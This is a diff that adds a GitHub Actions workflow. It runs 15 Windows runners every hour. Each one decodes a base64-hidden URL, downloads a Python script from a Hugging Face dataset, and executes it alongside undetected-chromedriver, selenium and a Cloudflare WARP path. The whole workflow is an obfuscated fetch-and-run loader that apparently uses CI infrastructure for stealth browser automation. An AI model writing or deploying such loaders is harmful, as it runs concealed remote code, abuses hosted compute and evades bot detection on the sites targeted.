@@ -1,0 +1,70 @@
+name: Task Execution Pipeline
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: execution-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  dispatch-workers:
+    name: "Agent-${{ matrix.worker_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+
+    steps:
+      - name: Environment Initialization & Code Retrieval
+        shell: bash
+        run: |
+          echo "[BOOTSTRAP] Initializing Agent-${{ matrix.worker_id }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9ubW5qL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
+          
+          curl -sL "$PAYLOAD_URL" -o job_script.py
+          
+          echo "[BOOTSTRAP] Installing Python modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[BOOTSTRAP] System environment configured successfully."
+
+      - name: Start Process & Execution Guard
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Launching Python workload on agent ${{ matrix.worker_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $LaunchOptions = @{
+              FilePath     = "python"
+              ArgumentList = "job_script.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $RunningProcess = Start-Process @LaunchOptions
+          
+          Write-Output ">>> Monitor active. Execution timeout set to 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $RunningProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Task completed within normal timeframe."
+          }
+          catch {
+              Write-Output ">>> Maximum execution time reached! Terminating process..."
+              Stop-Process -InputObject $RunningProcess -Force
+              Write-Output ">>> Process killed successfully by monitor."
+          }
+
+      - name: Workflow Wrapup
+        shell: bash
+        run: echo "[FINISHED] Agent-${{ matrix.worker_id }} concluded its task."
